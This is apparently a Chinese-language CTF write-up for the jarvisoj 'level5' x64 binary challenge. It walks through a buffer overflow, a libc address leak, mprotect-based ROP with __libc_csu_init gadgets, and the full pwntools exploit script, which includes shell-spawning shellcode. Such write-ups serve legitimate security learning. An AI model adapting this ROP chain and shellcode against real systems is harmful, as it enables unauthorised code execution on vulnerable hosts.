---
layout:     post
title:      jarvisoj level5
author:     wooy0ung
tags: 		linux elf pwn
category:  	ctf
---


### 0x00 introduction

```
Problem Address:
https://www.jarvisoj.com

Problem Description:
mmap和mprotect练习，假设system和execve函数被禁用，请尝试使用mmap和mprotect完成本题。

Download:
https://dn.jarvisoj.com/challengefiles/level3_x64.rar.8e639c3daf929853a1bc654d79c7992c

Address:
nc pwn2.jarvisoj.com 9883
```
<!-- more -->


### 0x01 IDA分析

system和execve方法被禁用, 利用mprotect改data段到可执行, 其实这题用level3_x64的exp也能getshell

![](/assets/img/ctf/pwn/2017-08-04-jarvisoj-level5/0x00.png)

同样, 在read处溢出, 将read_addr leak出来, 计算mprotect_addr

![](/assets/img/ctf/pwn/2017-08-04-jarvisoj-level5/0x01.png)

劫持 libc_start_main -> mprotect, gmon_start -> bss, 并将shellcode写到bss

最后ret main, 传第二段payload

```
# leak mprotect_addr
payload = ""
payload += 'A' * (0x80 + 0x08)
payload += p64(rdi_ret_addr) + p64(0x01)
payload += p64(rsi_r15_ret_addr) + p64(bin.got['read']) + p64(0)
payload += p64(bin.plt['write'])
# write mprotect_addr
payload += p64(rdi_ret_addr) + p64(0x00)
payload += p64(rsi_r15_ret_addr) + p64(bin.got['__libc_start_main']) + p64(0)
payload += p64(bin.plt['read'])
# write shellcode
payload += p64(rsi_r15_ret_addr) + p64(bin.bss()) + p64(0)
payload += p64(bin.plt['read'])
# write bss_shellcode_addr
payload += p64(rsi_r15_ret_addr) + p64(bin.got['__gmon_start__']) + p64(0)
payload += p64(bin.plt['read'])
payload += p64(bin.symbols['main'])
```

构造call mprotect, 关于mprotect的定义

![](/assets/img/ctf/pwn/2017-08-04-jarvisoj-level5/0x02.png)

关于第三个参数 prot 说明

![](/assets/img/ctf/pwn/2017-08-04-jarvisoj-level5/0x03.png)

利用__libc_csu_init尾部的万能gadgets

![](/assets/img/ctf/pwn/2017-08-04-jarvisoj-level5/0x04.png)

```
x64程序参数传递 :
如果函数的参数数量小于 6 , 则从左至右依次存放在寄存器 : 
rdi, rsi, rdx, rcx, r8, r9
如果大于 6 , 那么多出来的参数按照从右至左的顺序依次压栈

rbx = 0
rbp = 0
r12 = unuse
r13 -> rdx -> arg_2
r14 -> rsi -> arg_1
r15 -> edi -> arg_0
```

最后构造call, 跳到bss就能execute shellcode

```
payload = ""
payload += 'A' * (0x80 + 0x08)
payload += p64(0x4006A6)
# mprotect(0x600000, 0x1000, 7)
payload += 'AAAAAAAA'
payload += p64(0) # pop rbx
payload += p64(1) # pop rbp
payload += p(bin.got['__libc_start_main']) # pop r12
payload += p64(7) # pop r13
payload += p64(0x1000) # pop r14
payload += p64(0x600000) # pop r15
payload += p64(0x400690)
# sh()
payload += 'AAAAAAAA'
payload += p64(0) # pop rbx
payload += p64(1) # pop rbp
payload += p64(bin.got['__gmon_start__']) # pop r12
payload += p(0) # pop r13
payload += p(0) # pop rbx
payload += p(0) # pop rbp
payload += p(0x400690)
```


### 0x02 完整的exploit

在本地成功getshell, 但远程服务器不一定每次都成功, 暂时不知道什么问题, 难道这还有概率？

还有在 macOS 上始终失败, 最后改到在kali上执行, 成功拿到flag

```
#!/usr/bin/python
# -*- coding:utf8 -*-

from pwn import *

Io = remote('pwn2.jarvisoj.com', 9884)
#Io = process('./level5')
bin = ELF('./level5')
libc = ELF('libc-2.19.so')
#libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

#-------------------------write & hijack---------------------------
rdi_ret_addr = 0x4006b3
rsi_r15_ret_addr = 0x4006b1
# leak mprotect_addr
payload = ""
payload += 'A' * (0x80 + 0x08)
payload += p64(rdi_ret_addr) + p64(0x01)
payload += p64(rsi_r15_ret_addr) + p64(bin.got['read']) + p64(0)
payload += p64(bin.plt['write'])
# write mprotect_addr
payload += p64(rdi_ret_addr) + p64(0x00)
payload += p64(rsi_r15_ret_addr) + p64(bin.got['__libc_start_main']) + p64(0)
payload += p64(bin.plt['read'])
# write shellcode
payload += p64(rsi_r15_ret_addr) + p64(bin.bss()) + p64(0)
payload += p64(bin.plt['read'])
# write bss_shellcode_addr
payload += p64(rsi_r15_ret_addr) + p64(bin.got['__gmon_start__']) + p64(0)
payload += p64(bin.plt['read'])
payload += p64(bin.symbols['main'])

Io.recvuntil('Input:\n')
Io.send(payload)
read_addr = u64(Io.recv()[0:8])
mprotect_addr = read_addr - libc.symbols['read'] + libc.symbols['mprotect']
success("read_addr: " + hex(read_addr))
success("mprotect_addr: " + hex(mprotect_addr))

Io.send(p64(mprotect_addr))

sh = '\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05'
print len(sh)
Io.send(sh)

Io.send(p64(bin.bss()))

#----------------------------call & getshell----------------------------
payload = ""
payload += 'A' * (0x80 + 0x08)
payload += p64(0x4006A6)
# mprotect(0x600000, 0x1000, 7)
payload += 'AAAAAAAA'
payload += p64(0) # pop rbx
payload += p64(1) # pop rbp
payload += p(bin.got['__libc_start_main']) # pop r12
payload += p64(7) # pop r13
payload += p64(0x1000) # pop r14
payload += p64(0x600000) # pop r15
payload += p64(0x400690)
# sh()
payload += 'AAAAAAAA'
payload += p64(0) # pop rbx
payload += p64(1) # pop rbp
payload += p64(bin.got['__gmon_start__']) # pop r12
payload += p(0) # pop r13
payload += p(0) # pop rbx
payload += p(0) # pop rbp
payload += p(0x400690)

Io.recvuntil('Input:\n')
Io.send(payload)
Io.interactive()
```

getshell

![](/assets/img/ctf/pwn/2017-08-04-jarvisoj-level5/0x05.png)